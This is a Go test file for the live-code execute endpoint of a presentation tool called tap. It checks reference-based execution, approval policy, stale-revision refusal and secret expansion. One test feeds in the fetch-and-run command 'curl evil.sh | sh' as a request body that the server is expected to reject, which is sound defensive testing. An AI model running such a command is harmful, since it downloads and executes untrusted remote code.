package server

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/MiniCodeMonkey/tap/internal/config"
	"github.com/MiniCodeMonkey/tap/internal/driver"
	"github.com/MiniCodeMonkey/tap/internal/transformer"
)

// mockDriver is a test driver that returns predefined results.
type mockDriver struct {
	name   string
	result driver.Result
}

func (m *mockDriver) Name() string {
	return m.name
}

func (m *mockDriver) Execute(_ context.Context, _ string, _ map[string]string) driver.Result {
	return m.result
}

// recordingDriver succeeds and remembers what it ran.
type recordingDriver struct {
	config  map[string]string
	name    string
	ranCode string
}

func (d *recordingDriver) Name() string { return d.name }

func (d *recordingDriver) Execute(_ context.Context, code string, config map[string]string) driver.Result {
	d.ranCode = code
	d.config = config
	return driver.Result{Success: true, Output: "ran: " + code}
}

const undeclaredOtherMessage = `This deck does not declare the other driver. Add "other: {}" under drivers in the frontmatter.`

// liveDeck returns a presentation that declares the test driver. Slide 1
// has no code. Slide 2 has a plain block, a live test block, and a live
// block with the undeclared driver "other".
func liveDeck() *transformer.TransformedPresentation {
	return &transformer.TransformedPresentation{
		Config: config.Config{Drivers: map[string]config.DriverConfig{
			"test": {Connections: map[string]config.ConnectionConfig{"demo": {Password: "${TAP_TEST_EXECUTE_PASSWORD}"}}},
		}},
		Slides: []transformer.TransformedSlide{
			{Index: 0},
			{Index: 1, CodeBlocks: []transformer.TransformedCodeBlock{
				{Language: "go", Code: "package main"},
				{Language: "bash", Code: "echo one", Driver: "test", Block: 1},
				{Language: "bash", Code: "echo two", Driver: "other", Block: 2, Problem: undeclaredOtherMessage},
			}},
		},
	}
}

// executeServer returns a server with liveDeck loaded, the test and other
// drivers registered, and policy set.
func executeServer(t *testing.T, policy LiveCodePolicy) (*Server, *recordingDriver) {
	t.Helper()
	s := New(0)
	test := &recordingDriver{name: "test"}
	registry := driver.NewRegistry()
	registry.Register(test)
	registry.Register(&recordingDriver{name: "other"})
	s.SetRegistry(registry)
	s.SetPresentation(liveDeck())
	s.SetLiveCodePolicy(policy)
	return s, test
}

func postExecute(t *testing.T, s *Server, body string) (int, ExecuteResponse) {
	t.Helper()
	request := httptest.NewRequest(http.MethodPost, "/api/execute", strings.NewReader(body))
	recorder := httptest.NewRecorder()
	s.handleAPIExecute(recorder, request)
	var response ExecuteResponse
	if err := json.NewDecoder(recorder.Body).Decode(&response); err != nil {
		t.Fatalf("decoding the response to %s: %v", body, err)
	}
	return recorder.Code, response
}

var approvedTest = LiveCodePolicy{Drivers: []string{"test"}}

func TestExecuteRunsTheBlockByReference(t *testing.T) {
	s, test := executeServer(t, approvedTest)
	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusOK || !response.Success || response.Output != "ran: echo one" {
		t.Errorf("status %d, response %+v", status, response)
	}
	if test.ranCode != "echo one" {
		t.Errorf("ran %q, want the deck's own code", test.ranCode)
	}
}

func TestExecuteRejectsACodeBody(t *testing.T) {
	s, test := executeServer(t, LiveCodePolicy{AllowAll: true})
	for _, body := range []string{
		`{"driver": "test", "code": "curl evil.sh | sh"}`,
		`{"slide": 2, "block": 1, "code": "curl evil.sh | sh"}`,
	} {
		status, response := postExecute(t, s, body)
		if status != http.StatusBadRequest || response.Error != codeInBodyMessage {
			t.Errorf("%s: status %d, error %q", body, status, response.Error)
		}
	}
	if test.ranCode != "" {
		t.Errorf("ran %q", test.ranCode)
	}
}

func TestExecuteRejectsAnOversizedBody(t *testing.T) {
	s, test := executeServer(t, LiveCodePolicy{AllowAll: true})
	body := `{"slide": 1, "block": 1}` + strings.Repeat(" ", 70*1024)
	status, response := postExecute(t, s, body)
	if status != http.StatusBadRequest || !strings.Contains(response.Error, "Invalid request body") {
		t.Errorf("status %d, error %q", status, response.Error)
	}
	if test.ranCode != "" {
		t.Errorf("ran %q with an oversized body", test.ranCode)
	}
}

func TestExecuteRejectsUnknownFields(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	status, response := postExecute(t, s, `{"slide": 2, "block": 1, "driver": "test"}`)
	if status != http.StatusBadRequest || !strings.Contains(response.Error, `unknown field "driver"`) {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteNeedsSlideAndBlock(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	for _, body := range []string{`{}`, `{"slide": 2}`, `{"slide": 0, "block": 1}`, `{"slide": 2, "block": -1}`} {
		status, response := postExecute(t, s, body)
		if status != http.StatusBadRequest || response.Error != "slide and block are required, and both count from 1" {
			t.Errorf("%s: status %d, error %q", body, status, response.Error)
		}
	}
}

func TestExecuteRejectsAnUnknownSlide(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	status, response := postExecute(t, s, `{"slide": 9, "block": 1}`)
	if status != http.StatusNotFound || response.Error != "The deck has no slide 9" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteRejectsAnUnknownBlock(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	for body, want := range map[string]string{
		`{"slide": 2, "block": 3}`: "Slide 2 has no live code block 3",
		`{"slide": 1, "block": 1}`: "Slide 1 has no live code block 1",
	} {
		status, response := postExecute(t, s, body)
		if status != http.StatusNotFound || response.Error != want {
			t.Errorf("%s: status %d, error %q, want 404 %q", body, status, response.Error, want)
		}
	}
}

// TestExecuteRejectsANonLiveBlock pins the invariant that a code block
// with no driver, whose Block field is always 0 (see the transformer's
// TestTransformNumbersLiveBlocksAndFlagsUndeclaredDrivers), can never be
// reached by a reference: a request always asks for a block number of at
// least 1, so a block sitting at position 1 in the slide but carrying no
// driver is refused as an unknown block rather than treated as block 1.
// The test builds the presentation by hand, independent of the
// transformer, so it holds even if that detail of the transformer changed.
func TestExecuteRejectsANonLiveBlock(t *testing.T) {
	s := New(0)
	registry := driver.NewRegistry()
	registry.Register(&recordingDriver{name: "test"})
	s.SetRegistry(registry)
	s.SetPresentation(&transformer.TransformedPresentation{
		Slides: []transformer.TransformedSlide{
			{Index: 0, CodeBlocks: []transformer.TransformedCodeBlock{
				{Language: "go", Code: "package main"},
			}},
		},
	})
	s.SetLiveCodePolicy(LiveCodePolicy{AllowAll: true})

	status, response := postExecute(t, s, `{"slide": 1, "block": 1}`)
	if status != http.StatusNotFound || response.Error != "Slide 1 has no live code block 1" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

// TestExecuteRejectsAReferenceWithNoDeckLoaded reaches the no-presentation
// branch of findLiveBlock through the handler. The registry is set, so the
// request is not short-circuited by the earlier "Driver registry not
// configured" check.
func TestExecuteRejectsAReferenceWithNoDeckLoaded(t *testing.T) {
	s := New(0)
	registry := driver.NewRegistry()
	registry.Register(&recordingDriver{name: "test"})
	s.SetRegistry(registry)
	s.SetLiveCodePolicy(LiveCodePolicy{AllowAll: true})

	status, response := postExecute(t, s, `{"slide": 1, "block": 1}`)
	if status != http.StatusNotFound || response.Error != "No presentation loaded" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteRejectsAnUndeclaredDriver(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	status, response := postExecute(t, s, `{"slide": 2, "block": 2}`)
	if status != http.StatusUnprocessableEntity || response.Error != undeclaredOtherMessage {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteRejectsAnUnapprovedDeck(t *testing.T) {
	for _, policy := range []LiveCodePolicy{{}, {Drivers: []string{"sqlite"}}} {
		s, test := executeServer(t, policy)
		status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
		if status != http.StatusForbidden || response.Error != notApprovedMessage {
			t.Errorf("%+v: status %d, error %q", policy, status, response.Error)
		}
		if test.ranCode != "" {
			t.Errorf("%+v: ran %q", policy, test.ranCode)
		}
	}
}

// TestExecuteRefusesAStaleReference reproduces the reviewer's scenario:
// a reference is captured along with the revision it was rendered from,
// then a live block is inserted above the target on the same slide, so
// the same {slide, block} pair now names different code. Replaying the
// old reference with the old revision must be refused rather than run.
func TestExecuteRefusesAStaleReference(t *testing.T) {
	s, test := executeServer(t, approvedTest)
	s.SetRevision("rev-before")

	// The ordinary case: the revision the page rendered from still
	// matches, so the block the presenter can see is the block that runs.
	status, response := postExecute(t, s, `{"slide": 2, "block": 1, "revision": "rev-before"}`)
	if status != http.StatusOK || !response.Success || response.Output != "ran: echo one" {
		t.Fatalf("ordinary case: status %d, response %+v", status, response)
	}

	// A live block is inserted above the target on the same slide (the
	// deck reloads, as it does in tap dev while the author edits), so
	// block 1 now names different code, and the revision changes with it.
	presentation := liveDeck()
	presentation.Slides[1].CodeBlocks = append(
		[]transformer.TransformedCodeBlock{
			{Language: "bash", Code: "echo SURPRISE", Driver: "test", Block: 1},
		},
		presentation.Slides[1].CodeBlocks...,
	)
	// Renumber the live blocks the way the transformer would: 1-based,
	// live blocks only, in document order.
	next := 1
	for i := range presentation.Slides[1].CodeBlocks {
		block := &presentation.Slides[1].CodeBlocks[i]
		if block.Driver == "" {
			continue
		}
		block.Block = next
		next++
	}
	s.SetPresentation(presentation)
	s.SetRevision("rev-after")

	// Replaying the old reference with the old revision must be refused,
	// not run against whatever now sits at that position.
	status, response = postExecute(t, s, `{"slide": 2, "block": 1, "revision": "rev-before"}`)
	if status != http.StatusConflict || response.Code != staleRevisionErrorCode {
		t.Errorf("stale replay: status %d, response %+v", status, response)
	}
	if test.ranCode != "echo one" {
		t.Errorf("stale replay ran %q, want the block to stay unrun (last real run was %q)", test.ranCode, "echo one")
	}

	// A request with no revision at all must also be refused.
	status, response = postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusConflict || response.Code != staleRevisionErrorCode {
		t.Errorf("missing revision: status %d, response %+v", status, response)
	}

	// A revision that never existed must also be refused.
	status, response = postExecute(t, s, `{"slide": 2, "block": 1, "revision": "rev-that-never-existed"}`)
	if status != http.StatusConflict || response.Code != staleRevisionErrorCode {
		t.Errorf("unknown revision: status %d, response %+v", status, response)
	}

	// The current revision still runs the block now at that reference.
	status, response = postExecute(t, s, `{"slide": 2, "block": 1, "revision": "rev-after"}`)
	if status != http.StatusOK || !response.Success || response.Output != "ran: echo SURPRISE" {
		t.Errorf("current revision: status %d, response %+v", status, response)
	}
}

func TestExecuteWithNoPolicySetRunsNothing(t *testing.T) {
	s := New(0)
	registry := driver.NewRegistry()
	registry.Register(&recordingDriver{name: "test"})
	s.SetRegistry(registry)
	s.SetPresentation(liveDeck())
	status, _ := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusForbidden {
		t.Errorf("status %d, want 403", status)
	}
}

func TestExecuteReportsAFailedRun(t *testing.T) {
	s := New(0)
	registry := driver.NewRegistry()
	registry.Register(&mockDriver{name: "test", result: driver.Result{Success: false, Error: "syntax error"}})
	s.SetRegistry(registry)
	s.SetPresentation(liveDeck())
	s.SetLiveCodePolicy(approvedTest)
	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusInternalServerError || response.Error != "syntax error" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestExecuteExpandsTheConnectionWhenTheBlockRuns(t *testing.T) {
	t.Setenv("TAP_TEST_EXECUTE_PASSWORD", "hunter2")
	s, test := executeServer(t, approvedTest)
	presentation := liveDeck()
	presentation.Slides[1].CodeBlocks[1].Connection = "demo"
	s.SetPresentation(presentation)

	status, _ := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusOK || test.config["password"] != "hunter2" {
		t.Errorf("status %d, config %v", status, test.config)
	}
}

func TestExecuteFailsTheBlockOnAnUnsetVariable(t *testing.T) {
	t.Setenv("TAP_TEST_EXECUTE_PASSWORD", "")
	os.Unsetenv("TAP_TEST_EXECUTE_PASSWORD")
	s, test := executeServer(t, approvedTest)
	presentation := liveDeck()
	presentation.Slides[1].CodeBlocks[1].Connection = "demo"
	s.SetPresentation(presentation)

	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusInternalServerError || !strings.Contains(response.Error, "TAP_TEST_EXECUTE_PASSWORD is not set") {
		t.Errorf("status %d, error %q", status, response.Error)
	}
	if test.ranCode != "" {
		t.Errorf("ran %q with an unset variable", test.ranCode)
	}
}

func TestExecuteNamesADeclaredDriverWithNoCommand(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	presentation := liveDeck()
	presentation.Config.Drivers["python"] = config.DriverConfig{}
	presentation.Slides[1].CodeBlocks[1].Driver = "python"
	s.SetPresentation(presentation)

	status, response := postExecute(t, s, `{"slide": 2, "block": 1}`)
	if status != http.StatusBadRequest || response.Error != "driver not found: python" {
		t.Errorf("status %d, error %q", status, response.Error)
	}
}

func TestLiveCodePolicyAllows(t *testing.T) {
	if (LiveCodePolicy{}).Allows("shell") {
		t.Error("an empty policy allows shell")
	}
	if !(LiveCodePolicy{Drivers: []string{"shell"}}).Allows("shell") {
		t.Error("an approved driver is not allowed")
	}
	if !(LiveCodePolicy{AllowAll: true}).Allows("anything") {
		t.Error("--allow-code does not allow a driver")
	}
}

func TestHandleAPIExecute_MethodNotAllowed(t *testing.T) {
	s := New(0)

	req := httptest.NewRequest(http.MethodGet, "/api/execute", nil)
	w := httptest.NewRecorder()

	s.handleAPIExecute(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}

	var resp ExecuteResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}

	if resp.Success {
		t.Error("expected Success to be false")
	}
	if resp.Error != "Method not allowed" {
		t.Errorf("expected error 'Method not allowed', got %q", resp.Error)
	}
}

func TestHandleAPIExecute_InvalidJSON(t *testing.T) {
	s := New(0)

	req := httptest.NewRequest(http.MethodPost, "/api/execute", strings.NewReader("invalid json"))
	w := httptest.NewRecorder()

	s.handleAPIExecute(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp ExecuteResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}

	if resp.Success {
		t.Error("expected Success to be false")
	}
	if !strings.Contains(resp.Error, "Invalid request body") {
		t.Errorf("expected error to contain 'Invalid request body', got %q", resp.Error)
	}
}

func TestHandleAPIExecute_NoRegistry(t *testing.T) {
	s := New(0)

	body := ExecuteRequest{
		Slide: 1,
		Block: 1,
	}
	bodyBytes, _ := json.Marshal(body)

	req := httptest.NewRequest(http.MethodPost, "/api/execute", strings.NewReader(string(bodyBytes)))
	w := httptest.NewRecorder()

	s.handleAPIExecute(w, req)

	if w.Code != http.StatusInternalServerError {
		t.Errorf("expected status %d, got %d", http.StatusInternalServerError, w.Code)
	}

	var resp ExecuteResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}

	if resp.Success {
		t.Error("expected Success to be false")
	}
	if resp.Error != "Driver registry not configured" {
		t.Errorf("expected error 'Driver registry not configured', got %q", resp.Error)
	}
}

func TestBuildExecutionConfig_NoPresentation(t *testing.T) {
	s := New(0)

	config, err := s.buildExecutionConfig("shell", "")
	if err != nil {
		t.Fatal(err)
	}

	if len(config) != 0 {
		t.Errorf("expected empty config, got %v", config)
	}
}

func TestBuildExecutionConfig_NoDriverConfig(t *testing.T) {
	s := New(0)
	cfg := config.DefaultConfig()
	pres := &transformer.TransformedPresentation{
		Config: *cfg,
	}
	s.SetPresentation(pres)

	result, err := s.buildExecutionConfig("shell", "")
	if err != nil {
		t.Fatal(err)
	}

	if len(result) != 0 {
		t.Errorf("expected empty config, got %v", result)
	}
}

func TestBuildExecutionConfig_WithConnection(t *testing.T) {
	s := New(0)
	cfg := config.DefaultConfig()
	cfg.Drivers = map[string]config.DriverConfig{
		"mysql": {
			Timeout: 60,
			Connections: map[string]config.ConnectionConfig{
				"local": {
					Host:     "localhost",
					Port:     3306,
					User:     "root",
					Password: "secret",
					Database: "testdb",
				},
			},
		},
	}
	pres := &transformer.TransformedPresentation{
		Config: *cfg,
	}
	s.SetPresentation(pres)

	result, err := s.buildExecutionConfig("mysql", "local")
	if err != nil {
		t.Fatal(err)
	}

	if result["host"] != "localhost" {
		t.Errorf("expected host 'localhost', got %q", result["host"])
	}
	if result["port"] != "3306" {
		t.Errorf("expected port '3306', got %q", result["port"])
	}
	if result["user"] != "root" {
		t.Errorf("expected user 'root', got %q", result["user"])
	}
	if result["password"] != "secret" {
		t.Errorf("expected password 'secret', got %q", result["password"])
	}
	if result["database"] != "testdb" {
		t.Errorf("expected database 'testdb', got %q", result["database"])
	}
	if result["timeout"] != "60" {
		t.Errorf("expected timeout '60', got %q", result["timeout"])
	}
}

func TestBuildExecutionConfig_ConnectionNotFound(t *testing.T) {
	s := New(0)
	cfg := config.DefaultConfig()
	cfg.Drivers = map[string]config.DriverConfig{
		"mysql": {
			Connections: map[string]config.ConnectionConfig{},
		},
	}
	pres := &transformer.TransformedPresentation{
		Config: *cfg,
	}
	s.SetPresentation(pres)

	result, err := s.buildExecutionConfig("mysql", "nonexistent")
	if err != nil {
		t.Fatal(err)
	}

	// Should return empty config when connection not found
	if result["host"] != "" {
		t.Errorf("expected empty host, got %q", result["host"])
	}
}

func TestGetExecutionTimeout_Default(t *testing.T) {
	s := New(0)

	timeout := s.getExecutionTimeout("shell")

	if timeout != DefaultExecuteTimeout {
		t.Errorf("expected default timeout %v, got %v", DefaultExecuteTimeout, timeout)
	}
}

func TestGetExecutionTimeout_CustomTimeout(t *testing.T) {
	s := New(0)
	cfg := config.DefaultConfig()
	cfg.Drivers = map[string]config.DriverConfig{
		"mysql": {
			Timeout: 120,
		},
	}
	pres := &transformer.TransformedPresentation{
		Config: *cfg,
	}
	s.SetPresentation(pres)

	timeout := s.getExecutionTimeout("mysql")

	if timeout.Seconds() != 120 {
		t.Errorf("expected timeout 120s, got %v", timeout)
	}
}

func TestSetGetRegistry(t *testing.T) {
	s := New(0)

	if s.GetRegistry() != nil {
		t.Error("expected nil registry initially")
	}

	reg := driver.NewRegistry()
	s.SetRegistry(reg)

	if s.GetRegistry() != reg {
		t.Error("expected to get the same registry back")
	}
}

// TestHandleAPIExecute_ConcurrentSetRegistryDoesNotRace reproduces the
// data race between a request reading s.registry directly and a reload
// calling SetRegistry concurrently (the reload path tap dev takes on
// every file change). Run with -race: it fails on the unguarded reads,
// and passes once handleAPIExecute reads the registry once through
// GetRegistry and uses that local value throughout.
func TestHandleAPIExecute_ConcurrentSetRegistryDoesNotRace(t *testing.T) {
	s, _ := executeServer(t, LiveCodePolicy{AllowAll: true})
	registry := s.GetRegistry()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 200; i++ {
			s.SetRegistry(driver.NewRegistry())
		}
		s.SetRegistry(registry)
	}()

	for i := 0; i < 200; i++ {
		postExecute(t, s, `{"slide": 2, "block": 1}`)
	}
	<-done
}

func TestDefaultExecuteTimeoutMatchesTheSchemaDefault(t *testing.T) {
	if want := time.Duration(config.DefaultDriverTimeoutSeconds) * time.Second; DefaultExecuteTimeout != want {
		t.Errorf("DefaultExecuteTimeout = %s, want %s from config.DefaultDriverTimeoutSeconds", DefaultExecuteTimeout, want)
	}
}
